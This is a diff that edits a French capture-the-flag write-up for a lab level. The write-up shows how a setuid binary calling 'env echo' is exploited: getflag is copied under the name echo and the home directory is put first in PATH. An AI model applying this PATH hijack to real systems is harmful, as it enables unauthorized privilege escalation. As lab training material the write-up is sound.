@@ -1,8 +1,8 @@
-On se connecte on trouve un binaire `level03`
+On se connecte on trouve un binaire `level03`.
 
-On l'execute et cela nous sort `Exploit me`
+On l'execute et ça affiche `Exploit me`.
 
-On fait un `nm` sur le binaire
+On fait un `nm` sur le binaire.
 
 ```
 08049f28 d _DYNAMIC
@@ -44,26 +44,26 @@ On fait un `nm` sur le binaire
          U setresgid@@GLIBC_2.0
          U setresuid@@GLIBC_2.0
          U system@@GLIBC_2.0
-         ```
-Rien d'exploitable
+```
+Rien d'exploitable.
 
-On test donc avec `strings` 
-Cette ligne la nous a fait tilte 
+On test avec `strings`.
+
+Cette ligne, nous a fait tilte.
 `/usr/bin/env echo Exploit me`
 
-Avec l'env on utilise echo
+Avec l'env on utilise echo.
 
-Apres reflection
-Si on renone getflag en echo et qu'on change le PATH ca pourrais fonctionne
+Apres reflection, si on renomme `getflag` en `echo` et qu'on change le PATH ca pourrais fonctionne
 
-On copie 
-`getflag` dans le home et on le renome `echo`
+On copie `getflag` dans le home et on le renome `echo`
 
-On change le PATH avec 
+On change le PATH avec :
 
 ```bash
 export PATH=$HOME:$PATH
 ```
+
 ce qui ajoute le home au debut du path, le shell va donc chercher les binaires en premier dans le home
 
 on execute `./level03`
